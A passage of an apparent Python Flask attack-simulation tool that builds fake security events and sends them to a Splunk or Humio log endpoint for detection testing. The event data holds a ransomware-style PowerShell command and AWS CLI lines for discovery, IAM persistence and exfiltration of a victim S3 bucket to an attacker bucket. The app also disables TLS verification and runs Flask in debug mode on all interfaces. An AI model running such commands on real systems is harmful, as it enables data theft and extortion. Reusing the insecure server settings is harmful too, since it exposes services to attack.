    remote_exec_event["process"]["command_line"] = r'powershell.exe -Command "Write-Output \'YOUR FILES ARE ENCRYPTED!\' > C:\Users\Public\Desktop\RANSOM_NOTE.txt; Start-Process C:\Windows\Temp\ransomware.exe # RANSOMWARE SIMULATION"'
    remote_exec_event["event"]["outcome"] = "success"; remote_exec_event["log"]["level"] = "critical"; remote_exec_event["tags"].extend(["attack.impact", "attack.t1486", "attack.remote_execution"]); events.append(remote_exec_event)
    return events

# --- Cloud Chain (Updated Categories/Product) ---
def generate_chain_cloud_compromise():
    """Chain: Cloud Cred Use -> Cloud Discovery -> Cloud Persistence -> Exfil to Cloud Storage"""
    events = []; cloud_user = "cloud_admin_compromised"; aws_region = random.choice(["us-east-1", "eu-west-2", "ap-southeast-1"])
    victim_bucket, attacker_bucket = f"simcorp-sensitive-data-{random.randint(100,999)}", f"attacker-drop-zone-{random.randint(100,999)}"
    event_discover = get_base_event(category=["process", "cloud"], type=["start"], outcome="success") # Add cloud category
    event_discover["event"]["action"] = "process_creation"; event_discover["process"] = { "pid": random.randint(3000,9000), "name": "aws.exe", "command_line": f"aws ec2 describe-instances --region {aws_region}"}
    event_discover["user"]["name"] = cloud_user; event_discover["product"] = "AWS CLI"; event_discover["tags"] = ["attack.discovery", "attack.t1580", "cloud"]; events.append(event_discover)
    event_persist = get_base_event(category=["process", "cloud"], type=["start"], outcome="success"); event_persist["event"]["action"] = "process_creation" # Add cloud category
    new_user = f"backup_user_{random.randint(1,10)}"; event_persist["process"] = { "pid": random.randint(3000,9000), "name": "aws.exe", "command_line": f"aws iam create-user --user-name {new_user}"}
    event_persist["user"]["name"] = cloud_user; event_persist["product"] = "AWS CLI"; event_persist["tags"] = ["attack.persistence", "attack.t1098", "cloud"]; events.append(event_persist)
    event_exfil = get_base_event(category=["process", "cloud"], type=["start"], outcome="success"); event_exfil["event"]["action"] = "process_creation" # Add cloud category
    event_exfil["process"] = { "pid": random.randint(3000,9000), "name": "aws.exe", "command_line": f"aws s3 sync s3://{victim_bucket}/confidential/ s3://{attacker_bucket}/loot/ --region {aws_region}"}
    event_exfil["user"]["name"] = cloud_user; event_exfil["product"] = "AWS CLI"; event_exfil["tags"] = ["attack.exfiltration", "attack.t1567", "attack.t1567.002", "cloud"]; events.append(event_exfil)
    return events


# --- SCENARIOS Dictionary (Includes Cloud Chain) ---
SCENARIOS = {
    "chain1_email_exfil": generate_chain1_email_exfil,
    "chain4_linux_metadata_curl": generate_chain4_linux_metadata_curl,
    "chain_fin7": generate_chain_fin7,
    "chain_apt29": generate_chain_apt29,
    "chain_apt28": generate_chain_apt28,
    "chain_lazarus": generate_chain_lazarus,
    "chain_wizard_spider": generate_chain_wizard_spider,
    "chain_cloud_compromise": generate_chain_cloud_compromise, # Added cloud chain back
}


# --- Flask Routes ---
@app.route('/')
def index():
    """Render the HTML form."""
    scenario_display = {}
    for k in SCENARIOS.keys():
        if k.startswith("chain_"): name = k.split("chain_")[1].replace('_', ' ').title(); scenario_display[k] = f"Adversary: {name}"
        elif k == "chain1_email_exfil": scenario_display[k] = "Generic: Email -> HTTP Exfil"
        elif k == "chain4_linux_metadata_curl": scenario_display[k] = "Generic: Linux Metadata Access"
        elif k == "chain_cloud_compromise": scenario_display[k] = "Generic: Cloud Compromise Sim"
        else: scenario_display[k] = k.replace('_', ' ').title()
    # Pass the app title to the template
    return render_template('index.html', scenarios=scenario_display, app_title=APP_TITLE)

# (send_log route remains the same as previous version)
@app.route('/send_log', methods=['POST'])
def send_log():
    results, sent_payloads_sample = [], []
    is_humio_structured, total_events, success_count = False, 0, 0
    try:
        data = request.get_json(); hec_url, hec_token, chain_key = data.get('hec_url'), data.get('hec_token'), data.get('scenario')
        if not all([hec_url, hec_token, chain_key]): return jsonify({"error": "Missing required fields"}), 400
        if chain_key not in SCENARIOS: return jsonify({"error": f"Invalid scenario chain: {chain_key}"}), 400
        list_of_events = SCENARIOS[chain_key](); total_events = len(list_of_events)
        if total_events == 0: return jsonify({"message": f"No events generated for chain '{chain_key}'."}), 200
        headers = { 'Authorization': f'Splunk {hec_token}', 'Content-Type': 'application/json' }
        is_humio_structured = "/api/v1/humio-structured" in hec_url
        for i, event_data in enumerate(list_of_events):
            hec_payload = None
            try:
                if is_humio_structured:
                    ts = event_data.pop("@timestamp", get_utc_timestamp()); hec_payload = { "tags": { "sourcetype": "cs:test:attacksim:chain", "host": event_data.get("host", {}).get("name", "sim-host"), "vendor": FORCED_VENDOR, "scenario": chain_key, "step": f"{i+1}/{total_events}", **{f"attack_{tag.split('.')[-1]}": True for tag in event_data.get("tags", []) if tag.startswith("attack.t")}}, "events": [{"timestamp": ts, "attributes": event_data }] }
                else:
                    event_time = int(datetime.strptime(event_data.get("@timestamp"), '%Y-%m-%dT%H:%M:%S.%fZ').replace(tzinfo=timezone.utc).timestamp()); hec_payload = { "sourcetype": "cs:test:attacksim:chain", "source": f"attack-simulator:{chain_key}:step{i+1}", "host": event_data.get("host", {}).get("name", "sim-host"), "time": event_time, "event": event_data }
                if i == 0: sent_payloads_sample.append(hec_payload)
                response = requests.post(hec_url, headers=headers, json=hec_payload, verify=False, timeout=20); response.raise_for_status()
                try: hec_response_json = response.json()
                except json.JSONDecodeError: hec_response_json = {"text": response.text}
                results.append({"status": "success", "step": i+1, "http_status": response.status_code, "hec_response": hec_response_json}); success_count += 1
            except requests.exceptions.Timeout: results.append({"status": "error", "step": i+1, "error": "HEC Timeout", "details": f"Timeout after 20s."})
            except requests.exceptions.SSLError as e: results.append({"status": "error", "step": i+1, "error": "SSL Error", "details": str(e)})
            except requests.exceptions.RequestException as e:
                error_details, http_status = f"{e}", getattr(e.response, 'status_code', 500)
                if e.response is not None:
                    try: error_details = f"HEC Response (HTTP {http_status}): {json.dumps(e.response.json())}"
                    except json.JSONDecodeError: error_details = f"HEC Response (HTTP {http_status}): {e.response.text}"
                results.append({"status": "error", "step": i+1, "error": f"HEC Request Failed ({e.__class__.__name__})", "http_status": http_status, "details": error_details})
            except Exception as e: app.logger.error(f"Error step {i+1} for {chain_key}: {e}", exc_info=True); results.append({"status": "error", "step": i+1, "error": "Internal Error", "details": str(e)})
            time.sleep(0.1)
        final_status_code = 200 if success_count == total_events else (207 if success_count > 0 else 500)
        return jsonify({ "message": f"Sent {success_count}/{total_events} events for chain '{chain_key}'.", "results": results, "sent_payloads_sample": sent_payloads_sample }), final_status_code
    except Exception as e: app.logger.error(f"Unexpected server error: {e}", exc_info=True); return jsonify({"error": "An unexpected server error occurred", "details": str(e)}), 500

if __name__ == '__main__':
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    print("WARNING: SSL certificate verification is disabled for HEC requests.")
    app.run(debug=True, host='0.0.0.0', port=5001)